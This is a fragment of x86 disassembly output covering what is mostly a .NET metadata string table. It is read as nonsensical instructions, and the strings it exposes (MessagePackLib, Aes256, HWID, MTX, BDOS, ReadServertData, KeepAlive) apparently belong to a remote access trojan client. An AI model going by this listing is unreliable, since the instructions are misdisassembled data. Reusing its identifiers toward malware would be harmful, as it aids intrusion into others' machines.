  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 27                	add    %ah,(%edi)
  407705:	0f 1a 0f             	bndldx (%edi),%bnd1
  407708:	32 0f                	xor    (%edi),%cl
  40770a:	ef                   	out    %eax,(%dx)
  40770b:	05 5b 06 75 06       	add    $0x675065b,%eax
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	16                   	push   %ss
  40771b:	1c 01                	sbb    $0x1,%al
  40771d:	00 00                	add    %al,(%eax)
  40771f:	01 73 00             	add    %esi,0x0(%ebx)
  407722:	01 1c 01             	add    %ebx,(%ecx,%eax,1)
  407725:	00 00                	add    %al,(%eax)
  407727:	01 75 00             	add    %esi,0x0(%ebp)
  40772a:	e6 05                	out    %al,$0x5
  40772c:	02 00                	add    (%eax),%al
  40772e:	41                   	inc    %ecx
  40772f:	01 77 00             	add    %esi,0x0(%edi)
  407732:	17                   	pop    %ss
  407733:	1b 02                	sbb    (%edx),%eax
  407735:	00 40 01             	add    %al,0x1(%eax)
  407738:	79 00                	jns    0x40773a
  40773a:	ba 08 02 00 40       	mov    $0x40000208,%edx
  40773f:	01 7b 00             	add    %edi,0x0(%ebx)
  407742:	83 0e 03             	orl    $0x3,(%esi)
  407745:	00 50 20             	add    %dl,0x20(%eax)
  407748:	00 00                	add    %al,(%eax)
  40774a:	2d 00 70 20 00       	sub    $0x207000,%eax
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	75 12                	jne    0x407778
  407766:	00 00                	add    %al,(%eax)
  407768:	04 00                	add    $0x0,%al
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	b8 02 00 00 00       	mov    $0x2,%eax
  40777b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	f3 0f 00 00          	repz sldt (%eax)
  40778e:	00 00                	add    %al,(%eax)
  407790:	04 00                	add    $0x0,%al
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 d9                	add    %bl,%cl
  40779f:	0c 00                	or     $0x0,%al
  4077a1:	00 00                	add    %al,(%eax)
  4077a3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	42                   	inc    %edx
  4077b3:	08 00                	or     %al,(%eax)
  4077b5:	00 00                	add    %al,(%eax)
  4077b7:	00 0a                	add    %cl,(%edx)
	...
  4077c1:	00 00                	add    %al,(%eax)
  4077c3:	00 cc                	add    %cl,%ah
  4077c5:	00 dc                	add    %bl,%ah
  4077c7:	02 00                	add    (%eax),%al
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 95 1a 00 00 00    	add    %dl,0x1a(%ebp)
  4077df:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	bc 17 00 00 00       	mov    $0x17,%esp
  4077f3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 ab 12 00 00 00    	add    %ch,0x12(%ebx)
  407807:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407829:	70 5f                	jo     0x40788a
  40782b:	5f                   	pop    %edi
  40782c:	30 00                	xor    %al,(%eax)
  40782e:	49                   	dec    %ecx
  40782f:	45                   	inc    %ebp
  407830:	6e                   	outsb  %ds:(%esi),(%dx)
  407831:	75 6d                	jne    0x4078a0
  407833:	65 72 61             	gs jb  0x407897
  407836:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  40783a:	31 00                	xor    %eax,(%eax)
  40783c:	43                   	inc    %ebx
  40783d:	61                   	popa
  40783e:	6c                   	insb   (%dx),%es:(%edi)
  40783f:	6c                   	insb   (%dx),%es:(%edi)
  407840:	53                   	push   %ebx
  407841:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407848:	69 
  407849:	73 74                	jae    0x4078bf
  40784b:	60                   	pusha
  40784c:	31 00                	xor    %eax,(%eax)
  40784e:	61                   	popa
  40784f:	31 00                	xor    %eax,(%eax)
  407851:	76 31                	jbe    0x407884
  407853:	00 5f 5f             	add    %bl,0x5f(%edi)
  407856:	53                   	push   %ebx
  407857:	74 61                	je     0x4078ba
  407859:	74 69                	je     0x4078c4
  40785b:	63 41 72             	arpl   %eax,0x72(%ecx)
  40785e:	72 61                	jb     0x4078c1
  407860:	79 49                	jns    0x4078ab
  407862:	6e                   	outsb  %ds:(%esi),(%dx)
  407863:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40786a:	69 
  40786b:	7a 65                	jp     0x4078d2
  40786d:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  407872:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407879:	74 2e                	je     0x4078a9
  40787b:	57                   	push   %edi
  40787c:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  407883:	55                   	push   %ebp
  407884:	49                   	dec    %ecx
  407885:	6e                   	outsb  %ds:(%esi),(%dx)
  407886:	74 33                	je     0x4078bb
  407888:	32 00                	xor    (%eax),%al
  40788a:	54                   	push   %esp
  40788b:	6f                   	outsl  %ds:(%esi),(%dx)
  40788c:	49                   	dec    %ecx
  40788d:	6e                   	outsb  %ds:(%esi),(%dx)
  40788e:	74 33                	je     0x4078c3
  407890:	32 00                	xor    (%eax),%al
  407892:	53                   	push   %ebx
  407893:	77 61                	ja     0x4078f6
  407895:	70 49                	jo     0x4078e0
  407897:	6e                   	outsb  %ds:(%esi),(%dx)
  407898:	74 33                	je     0x4078cd
  40789a:	32 00                	xor    (%eax),%al
  40789c:	3c 3e                	cmp    $0x3e,%al
  40789e:	6f                   	outsl  %ds:(%esi),(%dx)
  40789f:	5f                   	pop    %edi
  4078a0:	5f                   	pop    %edi
  4078a1:	32 00                	xor    (%eax),%al
  4078a3:	61                   	popa
  4078a4:	32 00                	xor    (%eax),%al
  4078a6:	58                   	pop    %eax
  4078a7:	35 30 39 43 65       	xor    $0x65433930,%eax
  4078ac:	72 74                	jb     0x407922
  4078ae:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4078b5:	32 00                	xor    (%eax),%al
  4078b7:	76 32                	jbe    0x4078eb
  4078b9:	00 76 33             	add    %dh,0x33(%esi)
  4078bc:	00 57 72             	add    %dl,0x72(%edi)
  4078bf:	69 74 65 55 49 6e 74 	imul   $0x36746e49,0x55(%ebp,%eiz,2),%esi
  4078c6:	36 
  4078c7:	34 00                	xor    $0x0,%al
  4078c9:	54                   	push   %esp
  4078ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4078cb:	55                   	push   %ebp
  4078cc:	49                   	dec    %ecx
  4078cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ce:	74 36                	je     0x407906
  4078d0:	34 00                	xor    $0x0,%al
  4078d2:	47                   	inc    %edi
  4078d3:	65 74 41             	gs je  0x407917
  4078d6:	73 55                	jae    0x40792d
  4078d8:	49                   	dec    %ecx
  4078d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4078da:	74 36                	je     0x407912
  4078dc:	34 00                	xor    $0x0,%al
  4078de:	53                   	push   %ebx
  4078df:	65 74 41             	gs je  0x407923
  4078e2:	73 55                	jae    0x407939
  4078e4:	49                   	dec    %ecx
  4078e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e6:	74 36                	je     0x40791e
  4078e8:	34 00                	xor    $0x0,%al
  4078ea:	54                   	push   %esp
  4078eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4078ec:	49                   	dec    %ecx
  4078ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ee:	74 36                	je     0x407926
  4078f0:	34 00                	xor    $0x0,%al
  4078f2:	53                   	push   %ebx
  4078f3:	77 61                	ja     0x407956
  4078f5:	70 49                	jo     0x407940
  4078f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f8:	74 36                	je     0x407930
  4078fa:	34 00                	xor    $0x0,%al
  4078fc:	54                   	push   %esp
  4078fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4078fe:	55                   	push   %ebp
  4078ff:	49                   	dec    %ecx
  407900:	6e                   	outsb  %ds:(%esi),(%dx)
  407901:	74 31                	je     0x407934
  407903:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  407908:	6e                   	outsb  %ds:(%esi),(%dx)
  407909:	74 31                	je     0x40793c
  40790b:	36 00 53 77          	add    %dl,%ss:0x77(%ebx)
  40790f:	61                   	popa
  407910:	70 49                	jo     0x40795b
  407912:	6e                   	outsb  %ds:(%esi),(%dx)
  407913:	74 31                	je     0x407946
  407915:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  407919:	41                   	inc    %ecx
  40791a:	43                   	inc    %ebx
  40791b:	53                   	push   %ebx
  40791c:	48                   	dec    %eax
  40791d:	41                   	inc    %ecx
  40791e:	32 35 36 00 53 68    	xor    0x68530036,%dh
  407924:	61                   	popa
  407925:	32 35 36 00 41 65    	xor    0x65410036,%dh
  40792b:	73 32                	jae    0x40795f
  40792d:	35 36 00 61 65       	xor    $0x65610036,%eax
  407932:	73 32                	jae    0x407966
  407934:	35 36 00 5f 5f       	xor    $0x5f5f0036,%eax
  407939:	53                   	push   %ebx
  40793a:	74 61                	je     0x40799d
  40793c:	74 69                	je     0x4079a7
  40793e:	63 41 72             	arpl   %eax,0x72(%ecx)
  407941:	72 61                	jb     0x4079a4
  407943:	79 49                	jns    0x40798e
  407945:	6e                   	outsb  %ds:(%esi),(%dx)
  407946:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40794d:	69 
  40794e:	7a 65                	jp     0x4079b5
  407950:	3d 36 00 67 65       	cmp    $0x65670036,%eax
  407955:	74 5f                	je     0x4079b6
  407957:	55                   	push   %ebp
  407958:	54                   	push   %esp
  407959:	46                   	inc    %esi
  40795a:	38 00                	cmp    %al,(%eax)
  40795c:	3c 4d                	cmp    $0x4d,%al
  40795e:	6f                   	outsl  %ds:(%esi),(%dx)
  40795f:	64 75 6c             	fs jne 0x4079ce
  407962:	65 3e 00 4d 65       	gs add %cl,%ds:0x65(%ebp)
  407967:	73 73                	jae    0x4079dc
  407969:	61                   	popa
  40796a:	67 65 50             	addr16 gs push %eax
  40796d:	61                   	popa
  40796e:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  407971:	69 62 2e 3c 50 72 69 	imul   $0x6972503c,0x2e(%edx),%esp
  407978:	76 61                	jbe    0x4079db
  40797a:	74 65                	je     0x4079e1
  40797c:	49                   	dec    %ecx
  40797d:	6d                   	insl   (%dx),%es:(%edi)
  40797e:	70 6c                	jo     0x4079ec
  407980:	65 6d                	gs insl (%dx),%es:(%edi)
  407982:	65 6e                	outsb  %gs:(%esi),(%dx)
  407984:	74 61                	je     0x4079e7
  407986:	74 69                	je     0x4079f1
  407988:	6f                   	outsl  %ds:(%esi),(%dx)
  407989:	6e                   	outsb  %ds:(%esi),(%dx)
  40798a:	44                   	inc    %esp
  40798b:	65 74 61             	gs je  0x4079ef
  40798e:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  407995:	42 
  407996:	32 41 31             	xor    0x31(%ecx),%al
  407999:	46                   	inc    %esi
  40799a:	39 39                	cmp    %edi,(%ecx)
  40799c:	30 32                	xor    %dh,(%edx)
  40799e:	42                   	inc    %edx
  40799f:	33 35 46 38 46 38    	xor    0x38463846,%esi
  4079a5:	38 30                	cmp    %dh,(%eax)
  4079a7:	45                   	inc    %ebp
  4079a8:	46                   	inc    %esi
  4079a9:	31 36                	xor    %esi,(%esi)
  4079ab:	39 32                	cmp    %esi,(%edx)
  4079ad:	43                   	inc    %ebx
  4079ae:	45                   	inc    %ebp
  4079af:	39 39                	cmp    %edi,(%ecx)
  4079b1:	34 37                	xor    $0x37,%al
  4079b3:	41                   	inc    %ecx
  4079b4:	31 39                	xor    %edi,(%ecx)
  4079b6:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  4079ba:	36 39 38             	cmp    %edi,%ss:(%eax)
  4079bd:	44                   	inc    %esp
  4079be:	38 46 35             	cmp    %al,0x35(%esi)
  4079c1:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  4079c5:	41                   	inc    %ecx
  4079c6:	37                   	aaa
  4079c7:	32 31                	xor    (%ecx),%dh
  4079c9:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  4079cf:	43                   	inc    %ebx
  4079d0:	35 38 42 00 47       	xor    $0x47004238,%eax
  4079d5:	43                   	inc    %ebx
  4079d6:	00 45 53             	add    %al,0x53(%ebp)
  4079d9:	5f                   	pop    %edi
  4079da:	53                   	push   %ebx
  4079db:	59                   	pop    %ecx
  4079dc:	53                   	push   %ebx
  4079dd:	54                   	push   %esp
  4079de:	45                   	inc    %ebp
  4079df:	4d                   	dec    %ebp
  4079e0:	5f                   	pop    %edi
  4079e1:	52                   	push   %edx
  4079e2:	45                   	inc    %ebp
  4079e3:	51                   	push   %ecx
  4079e4:	55                   	push   %ebp
  4079e5:	49                   	dec    %ecx
  4079e6:	52                   	push   %edx
  4079e7:	45                   	inc    %ebp
  4079e8:	44                   	inc    %esp
  4079e9:	00 45 53             	add    %al,0x53(%ebp)
  4079ec:	5f                   	pop    %edi
  4079ed:	44                   	inc    %esp
  4079ee:	49                   	dec    %ecx
  4079ef:	53                   	push   %ebx
  4079f0:	50                   	push   %eax
  4079f1:	4c                   	dec    %esp
  4079f2:	41                   	inc    %ecx
  4079f3:	59                   	pop    %ecx
  4079f4:	5f                   	pop    %edi
  4079f5:	52                   	push   %edx
  4079f6:	45                   	inc    %ebp
  4079f7:	51                   	push   %ecx
  4079f8:	55                   	push   %ebp
  4079f9:	49                   	dec    %ecx
  4079fa:	52                   	push   %edx
  4079fb:	45                   	inc    %ebp
  4079fc:	44                   	inc    %esp
  4079fd:	00 4d 61             	add    %cl,0x61(%ebp)
  407a00:	70 4e                	jo     0x407a50
  407a02:	61                   	popa
  407a03:	6d                   	insl   (%dx),%es:(%edi)
  407a04:	65 54                	gs push %esp
  407a06:	6f                   	outsl  %ds:(%esi),(%dx)
  407a07:	4f                   	dec    %edi
  407a08:	49                   	dec    %ecx
  407a09:	44                   	inc    %esp
  407a0a:	00 48 57             	add    %cl,0x57(%eax)
  407a0d:	49                   	dec    %ecx
  407a0e:	44                   	inc    %esp
  407a0f:	00 67 65             	add    %ah,0x65(%edi)
  407a12:	74 5f                	je     0x407a73
  407a14:	46                   	inc    %esi
  407a15:	6f                   	outsl  %ds:(%esi),(%dx)
  407a16:	72 6d                	jb     0x407a85
  407a18:	61                   	popa
  407a19:	74 49                	je     0x407a64
  407a1b:	44                   	inc    %esp
  407a1c:	00 45 58             	add    %al,0x58(%ebp)
  407a1f:	45                   	inc    %ebp
  407a20:	43                   	inc    %ebx
  407a21:	55                   	push   %ebp
  407a22:	54                   	push   %esp
  407a23:	49                   	dec    %ecx
  407a24:	4f                   	dec    %edi
  407a25:	4e                   	dec    %esi
  407a26:	5f                   	pop    %edi
  407a27:	53                   	push   %ebx
  407a28:	54                   	push   %esp
  407a29:	41                   	inc    %ecx
  407a2a:	54                   	push   %esp
  407a2b:	45                   	inc    %ebp
  407a2c:	00 38                	add    %bh,(%eax)
  407a2e:	37                   	aaa
  407a2f:	36 33 39             	xor    %ss:(%ecx),%edi
  407a32:	31 32                	xor    %esi,(%edx)
  407a34:	36 45                	ss inc %ebp
  407a36:	41                   	inc    %ecx
  407a37:	37                   	aaa
  407a38:	37                   	aaa
  407a39:	42                   	inc    %edx
  407a3a:	33 35 38 46 32 36    	xor    0x36324638,%esi
  407a40:	35 33 32 33 36       	xor    $0x36333233,%eax
  407a45:	37                   	aaa
  407a46:	44                   	inc    %esp
  407a47:	42                   	inc    %edx
  407a48:	41                   	inc    %ecx
  407a49:	36 37                	ss aaa
  407a4b:	43                   	inc    %ebx
  407a4c:	35 33 31 30 45       	xor    $0x45303133,%eax
  407a51:	46                   	inc    %esi
  407a52:	35 30 41 38 44       	xor    $0x44384130,%eax
  407a57:	39 38                	cmp    %edi,(%eax)
  407a59:	38 38                	cmp    %bh,(%eax)
  407a5b:	45                   	inc    %ebp
  407a5c:	44                   	inc    %esp
  407a5d:	30 37                	xor    %dh,(%edi)
  407a5f:	30 43 44             	xor    %al,0x44(%ebx)
  407a62:	34 30                	xor    $0x30,%al
  407a64:	45                   	inc    %ebp
  407a65:	31 46 36             	xor    %eax,0x36(%esi)
  407a68:	30 35 41 38 46 00    	xor    %dh,0x463841
  407a6e:	67 65 74 5f          	addr16 gs je 0x407ad1
  407a72:	41                   	inc    %ecx
  407a73:	53                   	push   %ebx
  407a74:	43                   	inc    %ebx
  407a75:	49                   	dec    %ecx
  407a76:	49                   	dec    %ecx
  407a77:	00 53 79             	add    %dl,0x79(%ebx)
  407a7a:	73 74                	jae    0x407af0
  407a7c:	65 6d                	gs insl (%dx),%es:(%edi)
  407a7e:	2e 49                	cs dec %ecx
  407a80:	4f                   	dec    %edi
  407a81:	00 49 73             	add    %cl,0x73(%ecx)
  407a84:	58                   	pop    %eax
  407a85:	50                   	push   %eax
  407a86:	00 42 44             	add    %al,0x44(%edx)
  407a89:	4f                   	dec    %edi
  407a8a:	53                   	push   %ebx
  407a8b:	00 45 53             	add    %al,0x53(%ebp)
  407a8e:	5f                   	pop    %edi
  407a8f:	43                   	inc    %ebx
  407a90:	4f                   	dec    %edi
  407a91:	4e                   	dec    %esi
  407a92:	54                   	push   %esp
  407a93:	49                   	dec    %ecx
  407a94:	4e                   	dec    %esi
  407a95:	55                   	push   %ebp
  407a96:	4f                   	dec    %edi
  407a97:	55                   	push   %ebp
  407a98:	53                   	push   %ebx
  407a99:	00 67 65             	add    %ah,0x65(%edi)
  407a9c:	74 5f                	je     0x407afd
  407a9e:	49                   	dec    %ecx
  407a9f:	56                   	push   %esi
  407aa0:	00 73 65             	add    %dh,0x65(%ebx)
  407aa3:	74 5f                	je     0x407b04
  407aa5:	49                   	dec    %ecx
  407aa6:	56                   	push   %esi
  407aa7:	00 47 65             	add    %al,0x65(%edi)
  407aaa:	6e                   	outsb  %ds:(%esi),(%dx)
  407aab:	65 72 61             	gs jb  0x407b0f
  407aae:	74 65                	je     0x407b15
  407ab0:	49                   	dec    %ecx
  407ab1:	56                   	push   %esi
  407ab2:	00 4d 54             	add    %cl,0x54(%ebp)
  407ab5:	58                   	pop    %eax
  407ab6:	00 76 61             	add    %dh,0x61(%esi)
  407ab9:	6c                   	insb   (%dx),%es:(%edi)
  407aba:	75 65                	jne    0x407b21
  407abc:	5f                   	pop    %edi
  407abd:	5f                   	pop    %edi
  407abe:	00 52 65             	add    %dl,0x65(%edx)
  407ac1:	61                   	popa
  407ac2:	64 53                	fs push %ebx
  407ac4:	65 72 76             	gs jb  0x407b3d
  407ac7:	65 72 74             	gs jb  0x407b3e
  407aca:	44                   	inc    %esp
  407acb:	61                   	popa
  407acc:	74 61                	je     0x407b2f
  407ace:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  407ad2:	61                   	popa
  407ad3:	00 6d 73             	add    %ch,0x73(%ebp)
  407ad6:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407ad9:	6c                   	insb   (%dx),%es:(%edi)
  407ada:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  407ae1:	65 6d                	gs insl (%dx),%es:(%edi)
  407ae3:	2e 43                	cs inc %ebx
  407ae5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ae6:	6c                   	insb   (%dx),%es:(%edi)
  407ae7:	6c                   	insb   (%dx),%es:(%edi)
  407ae8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407aed:	6e                   	outsb  %ds:(%esi),(%dx)
  407aee:	73 2e                	jae    0x407b1e
  407af0:	47                   	inc    %edi
  407af1:	65 6e                	outsb  %gs:(%esi),(%dx)
  407af3:	65 72 69             	gs jb  0x407b5f
  407af6:	63 00                	arpl   %eax,(%eax)
  407af8:	4d                   	dec    %ebp
  407af9:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407b00:	74 2e                	je     0x407b30
  407b02:	56                   	push   %esi
  407b03:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407b0a:	73 69                	jae    0x407b75
  407b0c:	63 00                	arpl   %eax,(%eax)
  407b0e:	67 65 74 5f          	addr16 gs je 0x407b71
  407b12:	53                   	push   %ebx
  407b13:	65 6e                	outsb  %gs:(%esi),(%dx)
  407b15:	64 53                	fs push %ebx
  407b17:	79 6e                	jns    0x407b87
  407b19:	63 00                	arpl   %eax,(%eax)
  407b1b:	45                   	inc    %ebp
  407b1c:	6e                   	outsb  %ds:(%esi),(%dx)
  407b1d:	64 52                	fs push %edx
  407b1f:	65 61                	gs popa
  407b21:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  407b25:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  407b2c:	00 
  407b2d:	54                   	push   %esp
  407b2e:	68 72 65 61 64       	push   $0x64616572
  407b33:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  407b37:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  407b3b:	6e                   	outsb  %ds:(%esi),(%dx)
  407b3c:	65 72 41             	gs jb  0x407b80
  407b3f:	64 64 00 53 48       	fs add %dl,%fs:0x48(%ebx)
  407b44:	41                   	inc    %ecx
  407b45:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  407b4b:	61                   	popa
  407b4c:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  407b52:	74 5f                	je     0x407bb3
  407b54:	43                   	inc    %ebx
  407b55:	6f                   	outsl  %ds:(%esi),(%dx)
  407b56:	6e                   	outsb  %ds:(%esi),(%dx)
  407b57:	6e                   	outsb  %ds:(%esi),(%dx)
  407b58:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b5d:	00 67 65             	add    %ah,0x65(%edi)
  407b60:	74 5f                	je     0x407bc1
  407b62:	49                   	dec    %ecx
  407b63:	73 43                	jae    0x407ba8
  407b65:	6f                   	outsl  %ds:(%esi),(%dx)
  407b66:	6e                   	outsb  %ds:(%esi),(%dx)
  407b67:	6e                   	outsb  %ds:(%esi),(%dx)
  407b68:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b6d:	00 73 65             	add    %dh,0x65(%ebx)
  407b70:	74 5f                	je     0x407bd1
  407b72:	49                   	dec    %ecx
  407b73:	73 43                	jae    0x407bb8
  407b75:	6f                   	outsl  %ds:(%esi),(%dx)
  407b76:	6e                   	outsb  %ds:(%esi),(%dx)
  407b77:	6e                   	outsb  %ds:(%esi),(%dx)
  407b78:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b7d:	00 52 65             	add    %dl,0x65(%edx)
  407b80:	63 65 69             	arpl   %esp,0x69(%ebp)
  407b83:	76 65                	jbe    0x407bea
  407b85:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407b89:	74 5f                	je     0x407bea
  407b8b:	47                   	inc    %edi
  407b8c:	75 69                	jne    0x407bf7
  407b8e:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  407b92:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  407b99:	64 
  407b9a:	53                   	push   %ebx
  407b9b:	79 6e                	jns    0x407c0b
  407b9d:	63 3e                	arpl   %edi,(%esi)
  407b9f:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407ba3:	61                   	popa
  407ba4:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407ba7:	6e                   	outsb  %ds:(%esi),(%dx)
  407ba8:	67 46                	addr16 inc %esi
  407baa:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407bb1:	73 43                	jae    0x407bf6
  407bb3:	6f                   	outsl  %ds:(%esi),(%dx)
  407bb4:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb5:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb6:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407bbb:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407bc0:	61                   	popa
  407bc1:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bc4:	6e                   	outsb  %ds:(%esi),(%dx)
  407bc5:	67 46                	addr16 inc %esi
  407bc7:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  407bce:	65 65 70 41          	gs gs jo 0x407c13
  407bd2:	6c                   	insb   (%dx),%es:(%edi)
  407bd3:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  407bda:	42                   	inc    %edx
  407bdb:	61                   	popa
  407bdc:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bdf:	6e                   	outsb  %ds:(%esi),(%dx)
  407be0:	67 46                	addr16 inc %esi
  407be2:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  407be9:	65 61                	gs popa
  407beb:	64 65 72 53          	fs gs jb 0x407c42
  407bef:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  407bf6:	42                   	inc    %edx
  407bf7:	61                   	popa
  407bf8:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bfb:	6e                   	outsb  %ds:(%esi),(%dx)
  407bfc:	67 46                	addr16 inc %esi
  407bfe:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  407c05:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  407c0c:	42                   	inc    %edx
  407c0d:	61                   	popa
  407c0e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c11:	6e                   	outsb  %ds:(%esi),(%dx)
  407c12:	67 46                	addr16 inc %esi
  407c14:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  407c1b:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407c1f:	61                   	popa
  407c20:	74 65                	je     0x407c87
  407c22:	50                   	push   %eax
  407c23:	6f                   	outsl  %ds:(%esi),(%dx)
